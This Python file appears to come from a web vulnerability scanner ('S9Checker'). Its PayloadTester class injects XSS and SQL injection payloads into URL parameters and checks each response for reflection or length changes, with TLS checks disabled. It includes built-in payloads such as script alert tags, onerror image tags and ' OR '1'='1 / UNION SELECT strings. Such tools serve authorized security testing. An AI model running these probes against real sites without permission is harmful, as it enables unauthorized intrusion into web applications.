
import asyncio
import aiohttp
import logging
import os
from typing import Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

logger = logging.getLogger("S9Checker")


class PayloadTester:

    def __init__(self, proxy: Optional[str] = None, timeout: int = 10):
        self.proxy = proxy
        self.timeout = timeout

    def _load_payloads(self, filename: str) -> list[str]:
        payload_dir = os.path.join(os.path.dirname(__file__), "payloads")
        filepath = os.path.join(payload_dir, filename)
        if not os.path.exists(filepath):
            return []
        with open(filepath, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]

    def _inject_xss(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _inject_sqli(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    async def _test_payload(self, session: aiohttp.ClientSession,
                            test_url: str, payload: str) -> dict:
        try:
            timeout = aiohttp.ClientTimeout(total=self.timeout)
            async with session.get(test_url, timeout=timeout,
                                   proxy=self.proxy, ssl=False) as resp:
                text = await resp.text()
                reflected = payload in text
                return {
                    "url": test_url,
                    "payload": payload,
                    "status": resp.status,
                    "reflected": reflected,
                    "length": len(text),
                }
        except Exception as e:
            return {"url": test_url, "payload": payload, "error": str(e)}

    async def test_xss(self, url: str, param: str,
                        custom_payloads: list[str] | None = None) -> list[dict]:
        payloads = custom_payloads or self._load_payloads("xss.txt")
        if not payloads:
            payloads = [
                "<script>alert(1)</script>",
                "'-alert(1)-'",
                "\"><img src=x onerror=alert(1)>",
                "{{7*7}}",
                "${7*7}",
                "<svg/onload=alert(1)>",
            ]

        results = []
        connector = aiohttp.TCPConnector(limit=10, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            for payload in payloads:
                test_url = self._inject_xss(url, param, payload)
                result = await self._test_payload(session, test_url, payload)
                results.append(result)
                if result.get("reflected"):
                    logger.warning(f"XSS REFLECTED: {payload}")
        return results

    async def test_sqli(self, url: str, param: str,
                         custom_payloads: list[str] | None = None) -> list[dict]:
        payloads = custom_payloads or self._load_payloads("sqli.txt")
        if not payloads:
            payloads = [
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' UNION SELECT NULL--",
                "1' AND 1=1--",
                "1' AND 1=2--",
                "admin'--",
            ]

        results = []
        connector = aiohttp.TCPConnector(limit=10, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            baseline_url = self._inject_sqli(url, param, "normaltest")
            try:
                timeout = aiohttp.ClientTimeout(total=self.timeout)
                async with session.get(baseline_url, timeout=timeout,
                                       proxy=self.proxy, ssl=False) as resp:
                    baseline_len = len(await resp.text())
            except Exception:
                baseline_len = 0

            for payload in payloads:
                test_url = self._inject_sqli(url, param, payload)
                result = await self._test_payload(session, test_url, payload)
                result["baseline_length"] = baseline_len
                result["length_diff"] = abs(result.get("length", 0) - baseline_len)
                results.append(result)
        return results
